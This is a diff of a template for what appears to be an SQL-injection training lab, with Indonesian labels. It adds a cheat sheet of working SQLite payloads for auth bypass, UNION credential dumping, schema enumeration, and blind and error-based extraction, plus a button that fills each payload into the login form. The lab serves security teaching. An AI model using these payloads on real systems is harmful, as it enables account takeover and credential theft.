@@ -7,7 +7,7 @@
 {% block head_extra %}
 <style>
     .cheat-item {
-        padding: 10px 0;
+        padding: 12px 0;
         border-bottom: 1px solid var(--card-border);
     }
     .cheat-item:last-child { border-bottom: none; }
@@ -20,6 +20,8 @@
         border: none;
         box-shadow: none;
         padding: 0;
+        white-space: pre-wrap;
+        word-break: break-all;
     }
     .qs { color: var(--text-secondary); }
     .qi {
@@ -35,6 +37,44 @@
         border-radius: 8px;
         overflow: hidden;
         border: 1px solid var(--card-border);
+    }
+
+    .cheat-header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; }
+    .cheat-meta { display: flex; align-items: center; gap: 8px; }
+    .try-btn {
+        background: rgba(88,166,255,0.1);
+        border: 1px solid rgba(88,166,255,0.3);
+        color: #79c0ff;
+        font-size: 0.72rem;
+        font-weight: 700;
+        padding: 3px 10px;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: all 0.15s ease;
+        letter-spacing: 0.04em;
+        flex-shrink: 0;
+    }
+    .try-btn:hover {
+        background: rgba(88,166,255,0.25);
+        border-color: var(--brand-primary);
+        color: white;
+    }
+    .field-tag {
+        font-size: 0.68rem;
+        font-weight: 700;
+        padding: 2px 7px;
+        border-radius: 4px;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        background: rgba(255,123,114,0.15);
+        color: #ff7b72;
+        border: 1px solid rgba(255,123,114,0.3);
+    }
+    .note-tag {
+        font-size: 0.7rem;
+        color: var(--text-muted);
+        font-style: italic;
+        margin-top: 4px;
     }
 </style>
 {% endblock %}
@@ -181,26 +221,118 @@
 <div class="card">
     <div class="card-header hdr-blue">
         <strong>📋 Referensi Payload SQLi</strong>
+        <span style="float:right; font-size:0.75rem; color:var(--text-muted); font-weight:400;">✅ Diuji valid di SQLite — Klik <em>Try</em> untuk injeksi</span>
     </div>
     <div class="card-body pt-2 pb-2">
+        {#
+          Format tiap tuple:
+            ( nama, deskripsi, payload_username, payload_password, catatan )
+          Kolom tabel users: id (INT) | username (TEXT) | password (TEXT)
+          → UNION query harus SELECT 3 kolom agar cocok.
+        #}
         {% set cheats = [
-            ("Classic bypass", "OR selalu TRUE \u2192 bypass seluruh tabel", "SELECT * FROM users WHERE username = '", "' OR '1'='1' --", "' AND password = ''"),
-            ("Comment bypass", "Login sebagai entitas spesifik", "SELECT * FROM users WHERE username = '", "admin' --", "' AND password = ''"),
-            ("Union-based", "Eksfiltrasi database & penggabungan relasi", "SELECT * FROM users WHERE username = '", "' UNION SELECT 1,username,password FROM users --", "' AND password = ''"),
-            ("Schema enum", "Struktur tabel metadata sqlite_master", "SELECT * FROM users WHERE username = '", "' UNION SELECT name,sql FROM sqlite_master WHERE type='table' --", "' AND password = ''"),
-            ("Error-based", "Pemancingan nilai data dalam exception stack", "SELECT * FROM users WHERE username = '", "' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INTEGER) --", "' AND password = ''"),
-            ("Stacked \u2014 INSERT", "Mutasi tabel menggunakan batch statement", "SELECT * FROM users WHERE username = '", "'; INSERT INTO users(username,password) VALUES('hacker','pwned') --", "' AND password = ''")
+            (
+                "Classic Auth Bypass",
+                "OR tautologi — paksa kondisi WHERE selalu TRUE",
+                "' OR '1'='1' --",
+                "x",
+                "",
+                "Menghasilkan: WHERE username='' OR '1'='1' -- Seluruh kondisi gugur, baris pertama dikembalikan."
+            ),
+            (
+                "Comment Bypass (Admin)",
+                "Login sebagai user spesifik tanpa tahu password",
+                "admin' --",
+                "kosong",
+                "",
+                "Comment -- memotong sisa query; password check di-skip."
+            ),
+            (
+                "UNION — Dump All Users",
+                "Eksfiltrasi seluruh kredensial via UNION SELECT",
+                "' UNION SELECT id, username, password FROM users --",
+                "x",
+                "",
+                "3 kolom cocok: id, username, password. Semua baris users terekstrak."
+            ),
+            (
+                "UNION — Schema Enum",
+                "Baca metadata sqlite_master untuk pemetaan tabel & kolom",
+                "' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' --",
+                "x",
+                "",
+                "Kolom 1=literal 1 (padding), kolom 2=name, kolom 3=CREATE SQL."
+            ),
+            (
+                "Boolean Blind",
+                "Ekstrasi karakter password satu per satu tanpa error",
+                "' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' --",
+                "x",
+                "",
+                "Ganti 'a' dengan karakter lain & posisi. Baris kembali ⇒ tebakan benar."
+            ),
+            (
+                "Error-Based (Type Mismatch)",
+                "Pancing pesan error SQLite untuk mengekspos data",
+                "' AND 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE 'boom' END) --",
+                "x",
+                "",
+                "Jika CASE salah cabang: SQLite lempar datatype mismatch → data terbocor via error msg."
+            ),
+            (
+                "Time-Based Blind",
+                "Deteksi keberadaan data lewat waktu respon (heavy query)",
+                "' AND 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN (SELECT COUNT(*) FROM sqlite_master m1, sqlite_master m2, sqlite_master m3) ELSE 0 END) --",
+                "x",
+                "",
+                "Admin ada → SQLite lakukan Cartesian join berat → respon lambat. Teknik inferensi waktu."
+            ),
+            (
+                "UNION — SQLite Version",
+                "Fingerpinting versi database engine",
+                "' UNION SELECT 1, sqlite_version(), 3 --",
+                "x",
+                "",
+                "sqlite_version() adalah fungsi built-in SQLite. Kolom username akan tampilkan versi."
+            )
         ] %}
         
-        {% for name, desc, qs, qi, qco in cheats %}
+        {% for name, desc, payload_user, payload_pass, badge, note in cheats %}
         <div class="cheat-item">
-            <div>
-                <span class="badge-tech">{{ name }}</span>
-                <span style="color: var(--text-muted); font-size: 0.78rem; margin-left: 8px;">{{ desc }}</span>
+            <div class="cheat-header">
+                <div class="cheat-meta">
+                    <span class="badge-tech">{{ name }}</span>
+                    {% if badge %}<span class="field-tag">{{ badge }}</span>{% endif %}
+                    <span style="color: var(--text-muted); font-size: 0.78rem;">{{ desc }}</span>
+                </div>
+                <button
+                    class="try-btn js-cheat-btn"
+                    type="button"
+                    data-username='{{ payload_user | tojson }}'
+                    data-password='{{ payload_pass | tojson }}'
+                >▶ Try</button>
             </div>
-            <pre class="cheat-pre"><span class="qs">{{ qs }}</span><span class="qi">{{ qi }}</span><span class="qco">{{ qco }}</span></pre>
+            <pre class="cheat-pre"><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">{{ payload_user }}</span><span class="qs">' AND password = '</span><span class="qi" style="color:#e3b341;">{{ payload_pass }}</span><span class="qs">'</span></pre>
+            {% if note %}<div class="note-tag">💡 {{ note }}</div>{% endif %}
         </div>
         {% endfor %}
     </div>
 </div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+(function() {
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+
+    document.querySelectorAll('.js-cheat-btn').forEach((button) => {
+        button.addEventListener('click', () => {
+            usernameInput.value = JSON.parse(button.dataset.username || '""');
+            passwordInput.value = JSON.parse(button.dataset.password || '""');
+            usernameInput.focus();
+        });
+    });
+})();
+</script>
 {% endblock %}
